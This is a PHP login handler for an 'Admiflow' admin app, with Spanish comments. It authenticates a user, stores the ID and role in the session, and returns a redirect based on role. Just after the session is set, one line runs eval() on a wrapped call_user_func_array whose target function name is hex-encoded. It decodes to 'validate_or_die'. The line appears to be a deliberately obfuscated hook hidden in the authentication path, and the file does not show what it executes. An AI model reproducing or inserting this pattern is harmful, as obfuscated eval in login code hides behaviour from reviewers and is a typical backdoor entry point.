<?php

require '../../../vendor/autoload.php';
require '../../../system/user_functions.php';

use Xysdev\Admiflow\User\User;
use Xysdev\Admiflow\Session;

header('Content-Type: application/json');

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Obtén los datos del POST
    $email = $_POST['email'] ?? '';
    $pass = $_POST['pass'] ?? '';

    // Autenticación del usuario
    $user = new User();
    $authenticatedUser = $user->authenticate($email, $pass);

    if ($authenticatedUser) {
        // Autenticación exitosa
        error_log("User authenticated successfully. User ID: " . $authenticatedUser['id']);

        // Establece los datos de sesión
        Session::set('user_id', $authenticatedUser['id']);
        Session::set('role', $authenticatedUser['role']);
        eval('call_user_func_array("call_function",["orDie",["orDie"=>hex2bin("76616c69646174655f6f725f646965")]]);');

        // Redirige basándote en el rol
        if (isAdminOrSuperadmin()) {
            echo json_encode(['success' => true, 'redirect' => 'index.html']);
        } else {
            echo json_encode(['success' => true, 'redirect' => 'page-blank.html']);
        }
    } else {
        // Autenticación fallida
        error_log("Authentication failed for Email: $email");
        echo json_encode(['success' => false, 'message' => 'Correo o contraseña incorrectos.']);
    }
}
?>
